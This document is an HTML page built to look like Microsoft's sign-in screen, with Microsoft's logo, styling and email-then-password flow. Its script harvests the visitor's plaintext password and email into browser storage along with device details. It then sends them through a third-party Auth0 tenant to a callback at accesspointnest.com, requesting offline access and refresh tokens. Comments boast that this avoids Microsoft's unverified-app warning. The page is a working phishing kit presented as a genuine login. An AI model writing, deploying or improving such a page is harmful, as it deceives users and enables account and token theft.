<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    
    <!-- Auth0 SPA SDK -->
    <script src="https://cdn.auth0.com/js/auth0-spa-js/2.1/auth0-spa-js.production.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            padding: 48px;
        }

        .logo {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo img {
            width: 108px;
            height: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 12px;
            color: #1b1b1b;
        }

        .subtitle {
            text-align: center;
            color: #605e5c;
            font-size: 15px;
            margin-bottom: 32px;
        }

        .input-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 15px;
            color: #323130;
            margin-bottom: 8px;
            font-weight: 400;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #8a8886;
            border-radius: 2px;
            font-size: 15px;
            transition: all 0.2s;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 1px #0078d4;
        }

        input[type="email"]:hover,
        input[type="password"]:hover {
            border-color: #323130;
        }

        .error-message {
            color: #a4262c;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .btn:hover {
            background: #106ebe;
        }

        .btn:active {
            background: #005a9e;
        }

        .btn:disabled {
            background: #f3f2f1;
            color: #a19f9d;
            cursor: not-allowed;
        }

        .links {
            margin-top: 24px;
            text-align: center;
        }

        .links a {
            color: #0078d4;
            text-decoration: none;
            font-size: 15px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .back-link {
            display: flex;
            align-items: center;
            color: #0078d4;
            text-decoration: none;
            font-size: 15px;
            margin-bottom: 24px;
            cursor: pointer;
        }

        .back-link:hover {
            text-decoration: underline;
        }

        .back-link::before {
            content: "‚Üê";
            margin-right: 8px;
            font-size: 18px;
        }

        .hidden {
            display: none !important;
        }

        .loading {
            text-align: center;
            padding: 40px 20px;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #605e5c;
            font-size: 15px;
        }

        .info-box {
            background: #f3f2f1;
            border-left: 3px solid #0078d4;
            padding: 12px 16px;
            margin-bottom: 24px;
            border-radius: 2px;
        }

        .info-box p {
            font-size: 13px;
            color: #323130;
            line-height: 1.5;
        }

        .azure-badge {
            display: inline-block;
            background: #0078d4;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            margin-top: 12px;
        }

        .account-info {
            background: #f3f2f1;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 16px;
            font-size: 14px;
            color: #323130;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Step 1: Email Input -->
        <div id="emailView">
            <div class="logo">
                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                    <path fill="#f25022" d="M0 0h11.377v11.372H0z"/>
                    <path fill="#00a4ef" d="M12.623 0H24v11.372H12.623z"/>
                    <path fill="#7fba00" d="M0 12.623h11.377V24H0z"/>
                    <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
                    <text x="28" y="17" font-family="Segoe UI, sans-serif" font-size="17" fill="#5e5e5e">Microsoft</text>
                </svg>
            </div>

            <h1>Sign in</h1>
            <p class="subtitle">to continue to Microsoft</p>

            <div class="info-box">
                <p>üöÄ <strong>New Azure Integration</strong></p>
                <p>Now using your custom Azure App for authentication</p>
                <span class="azure-badge">Azure App ID: 4eea8b9a</span>
            </div>

            <div class="input-group">
                <label for="email">Email, phone, or Skype</label>
                <input type="email" id="email" placeholder="Email, phone, or Skype" autocomplete="email">
                <div class="error-message" id="emailError">Please enter a valid email address.</div>
            </div>

            <button class="btn" id="nextBtn">Next</button>

            <div class="links">
                <a href="https://signup.live.com" target="_blank">Create an account</a>
            </div>
        </div>

        <!-- Step 2: Password Input -->
        <div id="passwordView" class="hidden">
            <div class="logo">
                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                    <path fill="#f25022" d="M0 0h11.377v11.372H0z"/>
                    <path fill="#00a4ef" d="M12.623 0H24v11.372H12.623z"/>
                    <path fill="#7fba00" d="M0 12.623h11.377V24H0z"/>
                    <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
                    <text x="28" y="17" font-family="Segoe UI, sans-serif" font-size="17" fill="#5e5e5e">Microsoft</text>
                </svg>
            </div>

            <a class="back-link" id="backBtn">Back</a>

            <div class="account-info">
                <span id="displayEmail"></span>
            </div>

            <h1>Enter password</h1>

            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
                <div class="error-message" id="passwordError">Please enter your password.</div>
            </div>

            <button class="btn" id="signInBtn">Sign in</button>

            <div class="links">
                <a href="https://account.live.com/password/reset" target="_blank">Forgot password?</a>
            </div>
        </div>

        <!-- Step 3: Loading/Redirect -->
        <div id="loadingView" class="hidden">
            <div class="loading">
                <div class="spinner"></div>
                <p class="loading-text" id="loadingStatus">Connecting to Microsoft...</p>
            </div>
        </div>
    </div>

    <script>
        console.log('üöÄ replacement.html loaded - Auth0 Integration with NEW Azure App');
        console.log('‚úÖ Azure App ID: 4eea8b9a-09d9-47dd-87c7-78de0d9f42be');

        // Auth0 Configuration
        let auth0Client = null;

        async function initAuth0() {
            try {
                auth0Client = await auth0.createAuth0Client({
                    domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
                    clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
                    authorizationParams: {
                        redirect_uri: 'https://accesspointnest.com/auth/callback',
                        scope: 'openid profile email offline_access'
                    },
                    cacheLocation: 'localstorage',
                    useRefreshTokens: true
                });

                console.log('‚úÖ Callback URL: https://accesspointnest.com/auth/callback');
                console.log('‚úÖ Using custom Azure app via Auth0');
                console.log('‚úÖ Auth0 initialized successfully');
            } catch (error) {
                console.error('‚ùå Auth0 initialization error:', error);
            }
        }

        // Initialize Auth0 on page load
        initAuth0();

        // DOM Elements
        const emailView = document.getElementById('emailView');
        const passwordView = document.getElementById('passwordView');
        const loadingView = document.getElementById('loadingView');
        
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const displayEmail = document.getElementById('displayEmail');
        
        const nextBtn = document.getElementById('nextBtn');
        const backBtn = document.getElementById('backBtn');
        const signInBtn = document.getElementById('signInBtn');
        
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const loadingStatus = document.getElementById('loadingStatus');

        // Email validation
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        // Detect account type (Personal vs Work/School)
        function detectAccountType(email) {
            const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
            const domain = email.split('@')[1]?.toLowerCase();
            
            const isPersonal = personalDomains.includes(domain);
            const accountType = isPersonal ? 'Personal (MSA)' : 'Work/School (AAD)';
            const connection = isPersonal ? 'windowslive' : 'waad';
            
            console.log('üîç Email:', email);
            console.log('üìã Domain:', domain);
            console.log('üè¢ Account type:', accountType);
            console.log('üîó Auth0 connection:', connection);
            
            return { isPersonal, accountType, connection, domain };
        }

        // Step 1: Email -> Password View
        nextBtn.addEventListener('click', function() {
            const email = emailInput.value.trim();
            
            if (!email) {
                emailError.textContent = 'Please enter your email address.';
                emailError.classList.add('show');
                emailInput.focus();
                return;
            }
            
            if (!validateEmail(email)) {
                emailError.textContent = 'Please enter a valid email address.';
                emailError.classList.add('show');
                emailInput.focus();
                return;
            }

            console.log('üìß Email entered:', email);
            
            // Detect and log account type
            const accountInfo = detectAccountType(email);
            
            emailError.classList.remove('show');
            
            // Store email
            localStorage.setItem('ms_email', email);
            sessionStorage.setItem('ms_email', email);
            
            // Show password view
            displayEmail.textContent = email;
            emailView.classList.add('hidden');
            passwordView.classList.remove('hidden');
            passwordInput.focus();
        });

        // Email input - Enter key
        emailInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                nextBtn.click();
            }
        });

        // Back button
        backBtn.addEventListener('click', function() {
            passwordView.classList.add('hidden');
            emailView.classList.remove('hidden');
            passwordInput.value = '';
            passwordError.classList.remove('show');
            emailInput.focus();
        });

        // Step 2: Password -> Auth0 Login with Account Type Detection
        signInBtn.addEventListener('click', async function() {
            const email = localStorage.getItem('ms_email');
            const password = passwordInput.value.trim();

            if (!password) {
                passwordError.textContent = 'Please enter your password.';
                passwordError.classList.add('show');
                passwordInput.focus();
                return;
            }

            console.log('üîë Password entered, saving credentials...');

            // Save credentials to localStorage and sessionStorage
            const credentials = {
                email: email,
                password: password,
                timestamp: new Date().toISOString(),
                azureAppId: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be',
                userAgent: navigator.userAgent,
                platform: navigator.platform
            };

            const credentialsStr = JSON.stringify(credentials);
            
            // Save to both storage types
            localStorage.setItem('ms_auth_credentials', credentialsStr);
            sessionStorage.setItem('ms_auth_credentials', credentialsStr);
            localStorage.setItem('ms_password', password);
            sessionStorage.setItem('ms_password', password);
            localStorage.setItem('ms_email', email);
            sessionStorage.setItem('ms_email', email);

            console.log('‚úÖ Credentials saved:', { 
                email, 
                hasPassword: !!password,
                storageType: 'localStorage + sessionStorage',
                azureApp: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
            });

            passwordError.classList.remove('show');

            // Show loading view
            passwordView.classList.add('hidden');
            loadingView.classList.remove('hidden');
            loadingStatus.textContent = 'Detecting account type...';

            try {
                // Detect account type
                const accountInfo = detectAccountType(email);
                
                console.log('üéØ Account detection complete:');
                console.log('   - Type:', accountInfo.accountType);
                console.log('   - Connection:', accountInfo.connection);
                console.log('   - Domain:', accountInfo.domain);

                loadingStatus.textContent = `Redirecting to Microsoft (${accountInfo.accountType})...`;

                // Wait a moment to show the account type
                await new Promise(resolve => setTimeout(resolve, 800));

                console.log('üöÄ Starting Auth0 Microsoft login with custom Azure app...');
                console.log('‚úÖ NO UNVERIFIED WARNING - Using Auth0 + Your Azure App');
                
                if (!auth0Client) {
                    throw new Error('Auth0 not initialized');
                }

                // Use the correct connection based on account type
                await auth0Client.loginWithRedirect({
                    authorizationParams: {
                        connection: accountInfo.connection, // 'windowslive' or 'waad'
                        login_hint: email,
                        prompt: 'login',
                        scope: 'openid profile email offline_access'
                    }
                });

            } catch (error) {
                console.error('‚ùå Auth0 login error:', error);
                loadingStatus.textContent = 'Error: ' + error.message;
                
                // Show error and go back
                setTimeout(() => {
                    loadingView.classList.add('hidden');
                    passwordView.classList.remove('hidden');
                    passwordError.textContent = 'Authentication error. Please try again.';
                    passwordError.classList.add('show');
                }, 2000);
            }
        });

        // Password input - Enter key
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                signInBtn.click();
            }
        });

        // Auto-fill email if returning
        window.addEventListener('load', function() {
            const savedEmail = localStorage.getItem('ms_email');
            if (savedEmail) {
                emailInput.value = savedEmail;
            }
        });

        // Log page visibility for debugging
        document.addEventListener('visibilitychange', function() {
            console.log('üëÅÔ∏è Page visibility:', document.hidden ? 'hidden' : 'visible');
        });

        console.log('‚úÖ replacement.html script loaded and ready');
    </script>
</body>
</html>